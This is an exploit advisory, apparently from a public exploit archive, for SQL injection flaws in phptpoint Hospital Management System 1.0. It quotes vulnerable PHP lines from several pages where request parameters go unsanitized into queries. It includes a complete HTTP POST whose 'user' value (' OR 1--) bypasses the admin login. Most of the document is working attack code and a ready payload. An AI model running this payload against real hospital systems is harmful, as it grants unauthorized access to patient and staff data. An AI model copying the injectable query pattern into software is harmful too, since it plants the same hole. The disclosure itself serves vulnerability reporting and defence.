@@ -1,0 +1,75 @@
+# Exploit Title:  phptpoint Hospital Management System 1.0 - 'user' SQL injection 
+# Date: 2018-10-24
+# Exploit Author: Boumediene KADDOUR 
+# Unit: Algerie Telecom R&D Unit
+# Vendor Homepage: https://www.phptpoint.com/
+# Software Link:  
+# Version: 1
+# Tested on: WAMP windows 10 x64
+# CVE: unknown
+
+# Description:
+# Phptpoint hospital management system suffers from multiple SQL injection vulnerabilities that 
+# allow an attacker to bypass the login page and authenticate with admin, and then easily 
+# get database information or execute arbitrary commands.
+ 
+# LOGIN.php SQL injection
+
+ 13  extract($_POST);
+ 14  if(isset($signIn))
+ 15  {
+ 16         //echo $user,$pass;
+ 17         //for Admin
+ 18         $que=mysql_query("select user,pass from admin where user='$user' and pass='$pass'");
+ 19          $row= mysql_num_rows($que);
+ 20          echo "raw ".$row;
+ 21          if($row)
+ 22          {
+ 23                 $_SESSION['admin']      =$user;
+ 24                 echo "<script>window.location='alist.php'</script>";
+
+# Payload:
+
+POST /hospital/index.php HTTP/1.1
+Host: 172.16.122.4
+Content-Length: 38
+Cache-Control: max-age=0
+Origin: http://172.16.122.4
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://172.16.122.4/hospital/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,fr;q=0.8,fr-FR;q=0.7
+Cookie: PHPSESSID=2kn5jlcarggk5u3bl1crarrj85
+Connection: close
+
+user=admin%40gmail.com'+OR+1--+&pass=anything&signIn=
+
+# ALIST.php SQLi
+
+33 $todel=$_GET['rno'];
+34 mysql_query("update appt SET ashow='N' where ano='$todel' ;");
+35 }
+
+# DUNDEL.php SQLi 
+
+21 $rno=$_GET["rno"];
+22 mysql_query("update doct set dshow='Y' where dno='$rno'");
+23 echo "<tr><td align=center><font size=4 color=green>SuccessfullyRecords Recovered</font></td></tr>";
+24  echo "<tr><td align=center><a href=dlist.php>Continue...</a></td></tr>";
+
+# PDEL.php SQLi
+
+25 $todel=$_GET['rno'];
+26 mysql_query("update Patient SET pshow='N' where pno='$todel' ;");
+
+# PUNDEL.php SQLi
+
+20 $rno=$_GET["rno"];
+21
+22 
+23 mysql_query("update Patient set pshow='Y' where pno='$rno'");
+24 echo "<tr><td align=center><font size=4 color=green>SuccessfullyRecords Recovered</font></td></tr>";
+25 echo "<tr><td align=center><a href=plist.php>Continue...</a></td></tr>";
